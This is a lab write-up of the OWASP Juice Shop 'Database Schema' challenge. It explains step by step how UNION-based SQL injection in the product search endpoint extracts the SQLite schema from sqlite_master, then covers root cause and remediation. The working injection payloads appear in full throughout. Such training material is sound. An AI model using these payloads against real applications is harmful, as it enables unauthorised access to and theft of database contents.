# Challenge: Database Schema

## Category

Injection / SQL Injection

## Platform

OWASP Juice Shop

## Objective

Exfiltrate the entire database schema definition via SQL Injection.

## What I observed

The application exposes a product search API endpoint:

```http
GET /rest/products/search?q=
```

The endpoint returns product data in JSON format.

From the normal response, I observed product fields such as:

```text
id
name
description
price
deluxePrice
image
createdAt
updatedAt
deletedAt
```

This indicated that the original backend query likely returns 9 columns.

## Initial approach

I started by using the SQL injection methodology I learned from PortSwigger:

1. Find an injectable parameter.
2. Determine the number of columns returned by the original query.
3. Use `UNION SELECT` to retrieve additional data.

I tried a payload like:

```http
GET /rest/products/search?q='union+select+null,null,null,null,null,null,null,null,null--
```

However, the server returned an internal server error.

## Error observed

The response contained a SQLite error:

```text
SQLITE_ERROR: near "union": syntax error
```

The error also revealed part of the backend SQL query:

```sql
SELECT * FROM Products
WHERE (
  (name LIKE '%'union select null,null,null,null,null,null,null,null,null--%'
   OR description LIKE '%'union select null,null,null,null,null,null,null,null,null--%')
  AND deletedAt IS NULL
)
ORDER BY name
```

## What I understood from the error

The issue was not the number of columns.

The problem was the injection position.

My payload was inserted inside a `LIKE '%...%'` expression:

```sql
name LIKE '%USER_INPUT%'
```

Because of that, a simple payload starting with:

```sql
' UNION SELECT ...
```

was not enough.

I needed to properly escape from:

1. the string,
2. the `LIKE` expression,
3. the surrounding parentheses.

## Correct hypothesis

The product search endpoint is SQL injectable, but the payload must match the SQL context used by Juice Shop.

The query structure suggests that I need to close the string and parentheses before starting the `UNION SELECT`.

A better payload shape is:

```text
')) UNION SELECT ...
```

## Testing steps

### 1. Confirm the correct UNION structure

Since the product query returns 9 columns, I tested with 9 values:

```http
GET /rest/products/search?q=')) UNION SELECT 1,2,3,4,5,6,7,8,9--
```

This payload is designed to match the 9-column structure of the original product query.

### 2. Identify the database type

The error message showed that the application uses SQLite:

```text
SQLITE_ERROR
```

This is important because SQLite stores schema information in the `sqlite_master` table.

Unlike PostgreSQL or MySQL labs, SQLite does not use `information_schema.tables` in the same way.

### 3. Query the SQLite schema table

In SQLite, the database schema can be retrieved from:

```sql
sqlite_master
```

The useful column is:

```text
sql
```

This column contains the `CREATE TABLE` statements.

### 4. Extract schema definitions

I used a `UNION SELECT` payload to place the schema definition into a visible product field:

```http
GET /rest/products/search?q=')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
```

This returned database schema definitions in the response.

## Result

The challenge was solved after retrieving schema definitions from the SQLite `sqlite_master` table through SQL injection.

The response exposed `CREATE TABLE` statements, including tables and columns used by the application.

## Why it worked

The product search endpoint inserted user-controlled input into a SQL query without safe parameterization.

Because the query results were returned in the HTTP response, it was possible to use a `UNION SELECT` attack to append data from the SQLite schema table.

The vulnerable endpoint normally returned product data, but the injected query made it return database schema information instead.

## Root cause

The root cause is unsafe SQL query construction.

The application allowed the `q` parameter from the product search endpoint to modify the structure of the SQL query.

Main issues:

* User input was not safely parameterized.
* SQL injection was possible in the product search functionality.
* SQL errors revealed useful backend query details.
* The database schema could be queried through `sqlite_master`.
* The application returned injected query results in the API response.

## Impact in a real application

In a real application, this vulnerability could allow an attacker to:

* Discover database tables and columns.
* Understand the internal database structure.
* Identify sensitive tables such as users, orders, sessions, or tokens.
* Prepare more targeted attacks against sensitive data.
* Chain schema discovery with credential extraction or account takeover.

Schema leakage is dangerous because it gives attackers a map of the database.

## Remediation

Recommended fixes:

* Use parameterized queries or prepared statements.
* Never concatenate user input directly into SQL queries.
* Validate and restrict search input where appropriate.
* Avoid returning detailed SQL errors to users.
* Use generic error messages in production.
* Apply least privilege to the database account used by the application.
* Add automated security tests for SQL injection in search and filter endpoints.
* Monitor suspicious query patterns such as `UNION SELECT`, comments, and schema-table access.

## What I learned

This challenge taught me that SQL injection payloads must be adapted to the backend query context.

A payload that works in a PortSwigger category filter may not work directly in Juice Shop because the input is placed inside a different SQL structure.

The important lesson was to read the SQL error carefully and understand where my input lands inside the backend query.

## Mistake I made

I initially thought the issue was the number of columns because I kept adding `NULL` values.

The real issue was syntax context.

My payload started with:

```text
' UNION SELECT ...
```

But Juice Shop required a payload shape closer to:

```text
')) UNION SELECT ...
```

because the input was inside:

```sql
LIKE '%USER_INPUT%'
```

and inside parentheses.

## Memory rule

```text
A SQLi payload must match the query context.
```

For Juice Shop product search:

```text
Input is inside LIKE '%...%' and parentheses.
Close the string and parentheses before using UNION.
```

For SQLite schema extraction:

```text
sqlite_master contains the database schema.
The sql column contains CREATE TABLE statements.
```

## Related patterns

* UNION-based SQL injection
* SQLite schema extraction
* Error-based query understanding
* Reading SQL errors to infer backend structure
* Adapting payloads to SQL context
